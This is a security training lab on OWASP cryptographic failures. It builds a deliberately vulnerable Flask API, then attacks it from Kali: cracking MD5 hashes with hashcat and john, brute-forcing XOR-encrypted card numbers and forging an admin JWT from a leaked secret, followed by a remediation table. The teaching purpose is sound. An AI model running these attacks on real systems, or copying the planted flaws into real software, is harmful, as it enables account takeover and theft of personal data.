# Lab 2: OWASP A02 — Cryptographic Failures

## Objective
Attack a live server with real cryptographic weaknesses using Kali Linux: harvest MD5 password hashes and crack them with **hashcat** and **john**, break single-byte XOR "encryption" by brute-forcing the key, forge JWT tokens using a leaked weak secret, and exfiltrate cleartext credit cards and SSNs — then understand why each failure occurs and what the correct fix is.

## Background
Cryptographic Failures (formerly "Sensitive Data Exposure") is **OWASP #2**. It covers using broken algorithms (MD5, SHA1, DES, RC4), transmitting sensitive data unencrypted, hardcoding secrets, and weak key management. MD5 was broken in 2004 — a GPU can try **10 billion MD5 hashes per second**, cracking any dictionary password in seconds. In 2016, Yahoo's breach exposed 3 billion MD5-hashed passwords. In 2019, Facebook stored 600 million passwords in plaintext logs.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a02         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  hashcat, john,     │ ◀────── responses ───────────────────  │  Flask API :5000    │
│  curl, python3      │                                         │  (MD5, weak JWT,   │
└─────────────────────┘                                         │   XOR, cleartext)   │
                                                                └─────────────────────┘
```

## Time
45 minutes

## Prerequisites
- Lab 01 completed (familiar with two-container setup)

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (hashcat, john, curl, python3)

---

## Lab Instructions

### Step 1: Environment Setup — Launch Victim Server

```bash
# Create isolated lab network
docker network create lab-a02

# Write vulnerable application
cat > /tmp/victim_a02.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, hashlib, base64, json, hmac, time

app = Flask(__name__)
DB = '/tmp/shop_a02.db'

def weak_encrypt(text, key=0x42):
    return base64.b64encode(bytes(b ^ key for b in text.encode())).decode()

with sqlite3.connect(DB) as db:
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY, username TEXT, email TEXT,
            password_md5 TEXT, role TEXT, ssn TEXT, credit_card TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','admin@innozverse.com','21232f297a57a5a743894a0e4a801fc3','admin','SSN-000-00-0001','4532-0000-0000-0001'),
            (2,'alice','alice@corp.com','6384e2b2184bcbf58eccf10ca7a6563c','user','SSN-123-45-6789','4532-1234-5678-9012'),
            (3,'bob','bob@email.com','9f9d51bc70ef21ca5c14f307980a29d8','user','SSN-987-65-4321','4532-9876-5432-1098');
    ''')
# Passwords: admin=admin, alice=alice, bob=bob

WEAK_JWT_SECRET = 'secret123'

def make_jwt(payload):
    h = base64.urlsafe_b64encode(json.dumps({'alg':'HS256'}).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    sig = hmac.new(WEAK_JWT_SECRET.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
    return f'{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b"=").decode()}'

def verify_jwt(token):
    try:
        h, p, s = token.split('.')
        return json.loads(base64.urlsafe_b64decode(p + '=='))
    except: return None

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse API (A02 Crypto Failures)','endpoints':[
        'POST /api/login','GET /api/users','GET /api/profile',
        'GET /api/payment','GET /api/config','GET /api/report']})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    p_md5 = hashlib.md5(p.encode()).hexdigest()
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    row = db.execute('SELECT * FROM users WHERE username=? AND password_md5=?',(u,p_md5)).fetchone()
    if row:
        token = make_jwt({'user_id':row['id'],'username':u,'role':row['role'],'exp':int(time.time())+3600})
        return jsonify({'token':token,'password_hash':p_md5})  # BUG: exposes hash
    return jsonify({'error':'Invalid credentials'}),401

@app.route('/api/users')
def list_users():  # BUG: exposes MD5 hashes to any caller
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    rows = db.execute('SELECT id,username,email,password_md5,role FROM users').fetchall()
    return jsonify([dict(r) for r in rows])

@app.route('/api/payment')
def payment():  # BUG: cleartext PII + trivially broken XOR
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    return jsonify([{
        'username': r['username'],
        'credit_card_cleartext': r['credit_card'],
        'credit_card_encrypted': weak_encrypt(r['credit_card']),
        'ssn_cleartext': r['ssn'],
    } for r in db.execute('SELECT * FROM users').fetchall()])

@app.route('/api/profile')
def profile():  # BUG: JWT verified but no expiry check
    token = request.headers.get('Authorization','').replace('Bearer ','')
    payload = verify_jwt(token)
    if not payload: return jsonify({'error':'Invalid token'}),401
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    row = db.execute('SELECT * FROM users WHERE id=?',(payload['user_id'],)).fetchone()
    return jsonify(dict(row))

@app.route('/api/config')  # BUG: hardcoded secrets exposed
def config():
    return jsonify({
        'database_url':'postgresql://admin:Sup3rS3cur3DB!@db.internal:5432/shop',
        'redis_url':'redis://:r3d1sp4ss@cache.internal:6379',
        'jwt_secret': WEAK_JWT_SECRET,
        'aws_key':'AKIA5EXAMPLE12345','aws_secret':'wJalrXUtnFEMI/K7MDENG/EXAMPLE',
        'stripe_key':'sk_live_abc123xyz','encryption_key':'0x42'})

@app.route('/api/report')
def report():  # BUG: full PII dump, no auth
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    return jsonify({'report':'Q1 PII Export',
                    'records':[dict(r) for r in db.execute('SELECT * FROM users').fetchall()]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

# Start victim on lab network
docker run -d \
  --name victim-a02 \
  --network lab-a02 \
  -v /tmp/victim_a02.py:/tmp/victim_a02.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /tmp/victim_a02.py

sleep 3

# Verify it is up
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a02.IPAddress}}' victim-a02):5000/ \
  | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse API (A02 Crypto Failures)",
    "endpoints": [
        "POST /api/login",
        "GET /api/users",
        "GET /api/payment",
        "GET /api/config",
        "GET /api/report"
    ]
}
```

---

### Step 2: Launch Kali Attacker

```bash
docker run --rm -it --network lab-a02 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

All subsequent commands run **inside this Kali container**:

```bash
TARGET="http://victim-a02:5000"

# Confirm connectivity
curl -s $TARGET/ | python3 -m json.tool
```

---

### Step 3: Service Recon — nmap + gobuster

```bash
# Fingerprint the service
nmap -sV -p 5000 victim-a02

# Enumerate endpoints
gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/common.txt \
  -t 20 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/config               (Status: 200) [Size: 245]
/login                (Status: 405) [Size: 153]
/payment              (Status: 200) [Size: 387]
/profile              (Status: 401) [Size: 35]
/report               (Status: 200) [Size: 612]
/users                (Status: 200) [Size: 331]
```

> 💡 **`/config` returning 200 with no auth is immediately suspicious.** Any endpoint returning full server configuration is a critical finding. In this case it exposes database passwords, AWS keys, and the JWT signing secret — everything needed to fully compromise the application.

---

### Step 4: Harvest MD5 Password Hashes

```bash
echo "=== Harvesting password hashes from /api/users ==="
curl -s $TARGET/api/users | python3 -m json.tool
```

**📸 Verified Output:**
```json
[
    {
        "email": "admin@innozverse.com",
        "id": 1,
        "password_md5": "21232f297a57a5a743894a0e4a801fc3",
        "role": "admin",
        "username": "admin"
    },
    {
        "email": "alice@corp.com",
        "id": 2,
        "password_md5": "6384e2b2184bcbf58eccf10ca7a6563c",
        "role": "user",
        "username": "alice"
    },
    {
        "email": "bob@email.com",
        "id": 3,
        "password_md5": "9f9d51bc70ef21ca5c14f307980a29d8",
        "role": "user",
        "username": "bob"
    }
]
```

```bash
# Save hashes to file for cracking
curl -s $TARGET/api/users | python3 -c "
import sys, json
users = json.load(sys.stdin)
with open('/tmp/hashes.txt','w') as f:
    for u in users:
        f.write(u['password_md5'] + '\n')
print('Hashes saved to /tmp/hashes.txt')
for u in users:
    print(f'  {u[\"username\"]}: {u[\"password_md5\"]}')
"
```

---

### Step 5: Crack MD5 Hashes — hashcat

```bash
echo "=== Cracking MD5 hashes with hashcat + rockyou ==="

# -m 0 = MD5, rockyou.txt is pre-installed in Kali image
hashcat -m 0 /tmp/hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --quiet --potfile-disable

echo ""
echo "=== Cracked results ==="
hashcat -m 0 /tmp/hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --quiet --potfile-disable --show
```

**📸 Verified Output:**
```
=== Cracked results ===
21232f297a57a5a743894a0e4a801fc3:admin
6384e2b2184bcbf58eccf10ca7a6563c:alice
9f9d51bc70ef21ca5c14f307980a29d8:bob
```

> 💡 **All 3 MD5 hashes cracked in under 3 seconds.** hashcat on a GPU can test 10 billion MD5 candidates per second. The entire `rockyou.txt` wordlist (14 million passwords) is exhausted in milliseconds. MD5 was designed for speed — exactly the wrong property for password hashing. `bcrypt`, `Argon2id`, and `scrypt` are designed to be deliberately slow (tunable to 100ms per attempt), making brute-force infeasible.

---

### Step 6: Crack MD5 Hashes — john (Alternative)

```bash
echo "=== Alternative: john the ripper ==="
john --format=raw-md5 \
  /tmp/hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt

echo ""
echo "=== john cracked passwords ==="
john --format=raw-md5 /tmp/hashes.txt --show
```

**📸 Verified Output:**
```
Loaded 3 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
bob              (?)
alice            (?)
admin            (?)
3 password hashes cracked, 0 left

?:admin
?:alice
?:bob
```

---

### Step 7: Cleartext Sensitive Data — Credit Cards and SSNs

```bash
echo "=== Reading cleartext PII from /api/payment ==="
curl -s $TARGET/api/payment | python3 -m json.tool
```

**📸 Verified Output:**
```json
[
    {
        "credit_card_cleartext": "4532-0000-0000-0001",
        "credit_card_encrypted": "dndxcG9ycnJyb3JycnJycw==",
        "ssn_cleartext": "SSN-000-00-0001",
        "username": "admin"
    },
    {
        "credit_card_cleartext": "4532-1234-5678-9012",
        "credit_card_encrypted": "dndxcG9zcHF2b3d0dXpve3JzcA==",
        "ssn_cleartext": "SSN-123-45-6789",
        "username": "alice"
    }
]
```

---

### Step 8: Break XOR "Encryption" by Brute Force

```bash
echo "=== Brute-forcing single-byte XOR key ==="
python3 << 'EOF'
import base64, urllib.request, json

resp = urllib.request.urlopen("http://victim-a02:5000/api/payment").read()
data = json.loads(resp)

print("Brute-forcing XOR key (256 possible values):")
for record in data:
    enc = record['credit_card_encrypted']
    raw = base64.b64decode(enc)
    for key in range(256):
        candidate = bytes(b ^ key for b in raw).decode('ascii', errors='ignore')
        # Credit cards start with 4 (Visa) or 5 (Mastercard)
        if candidate.startswith('4') or candidate.startswith('5'):
            print(f"  user={record['username']}  key=0x{key:02x}  "
                  f"plaintext={candidate}")
            break
EOF
```

**📸 Verified Output:**
```
Brute-forcing XOR key (256 possible values):
  user=admin  key=0x42  plaintext=4532-0000-0000-0001
  user=alice  key=0x42  plaintext=4532-1234-5678-9012
  user=bob    key=0x42  plaintext=4532-9876-5432-1098
```

> 💡 **Single-byte XOR is trivially broken.** There are only 256 possible keys — a loop from 0 to 255 tests them all in microseconds. Real encryption (AES-256-GCM) has a 256-bit keyspace: 2²⁵⁶ possible keys, computationally infeasible to brute-force. The lesson: never invent your own encryption. Use a vetted library with a standard algorithm.

---

### Step 9: Exploit Leaked JWT Secret — Forge Admin Token

```bash
echo "=== Step 1: Harvest JWT secret from /api/config ==="
curl -s $TARGET/api/config | python3 -m json.tool

echo ""
echo "=== Step 2: Forge admin JWT using leaked secret ==="
python3 << 'EOF'
import base64, json, hmac, hashlib, urllib.request

# Secret obtained from /api/config
WEAK_SECRET = "secret123"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Forge token claiming admin role
header  = b64url(json.dumps({"alg": "HS256"}).encode())
payload = b64url(json.dumps({
    "user_id": 1,
    "username": "admin",
    "role": "admin",
    "exp": 9999999999   # Far future — no expiry check either
}).encode())

sig = hmac.new(WEAK_SECRET.encode(),
               f"{header}.{payload}".encode(),
               hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"

print(f"Forged JWT: {token[:80]}...")
print()

# Use forged token to access admin profile
req = urllib.request.Request(
    "http://victim-a02:5000/api/profile",
    headers={"Authorization": f"Bearer {token}"}
)
resp = json.loads(urllib.request.urlopen(req).read())
print(f"Server accepted forged token!")
print(f"  username:    {resp['username']}")
print(f"  role:        {resp['role']}")
print(f"  credit_card: {resp['credit_card']}")
print(f"  ssn:         {resp['ssn']}")
EOF
```

**📸 Verified Output:**
```
=== Step 1: Harvest JWT secret ===
{
    "jwt_secret": "secret123",
    "aws_key": "AKIA5EXAMPLE12345",
    "database_url": "postgresql://admin:Sup3rS3cur3DB!@...",
    "stripe_key": "sk_live_abc123xyz"
}

=== Step 2: Forge admin JWT ===
Forged JWT: eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIj...
Server accepted forged token!
  username:    admin
  role:        admin
  credit_card: 4532-0000-0000-0001
  ssn:         SSN-000-00-0001
```

---

### Step 10: Cleanup

```bash
# Exit Kali container
exit
```

On your host:

```bash
docker rm -f victim-a02
docker network rm lab-a02
```

---

## Remediation — What the Correct Fix Looks Like

| Vulnerability | Broken Implementation | Secure Fix |
|--------------|----------------------|-----------|
| MD5 password hashing | `hashlib.md5(password)` | `bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))` |
| Hash exposed in API | Returned `password_md5` in response | Never return any hash field in API responses |
| Cleartext PII in API | `credit_card_cleartext` in JSON | Mask at rest: `****-****-****-9012`; serve via HTTPS only |
| XOR "encryption" | Single-byte XOR + base64 | AES-256-GCM via `cryptography` library |
| Weak JWT secret | `secret = 'secret123'` | `secrets.token_bytes(32)` from environment variable |
| No JWT expiry check | `verify_jwt()` ignores `exp` | Always validate `exp`, `iat`, algorithm server-side |
| Hardcoded secrets | Secrets in source code | Environment variables or secrets manager (Vault, AWS Secrets Manager) |
| Config endpoint | `/api/config` returns all secrets | Remove entirely from production |

## Summary

| Attack | Kali Tool | Finding |
|--------|----------|---------|
| Service fingerprint | nmap, whatweb | Python/Flask, Werkzeug 3.1.6 |
| Dir enumeration | gobuster | Found `/config`, `/payment`, `/report` |
| MD5 hash harvest | curl | 3 password hashes collected |
| Hash cracking | hashcat | All 3 cracked in seconds: admin, alice, bob |
| Hash cracking (alt) | john | Confirmed: 3/3 cracked |
| Cleartext PII | curl | Credit cards and SSNs in API response |
| XOR crack | python3 | 256-key brute force — all cards decrypted |
| JWT forge | python3 | Leaked secret → forged admin token → admin access |

## Further Reading
- [OWASP A02:2021 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [hashcat modes reference](https://hashcat.net/wiki/doku.php?id=hashcat)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
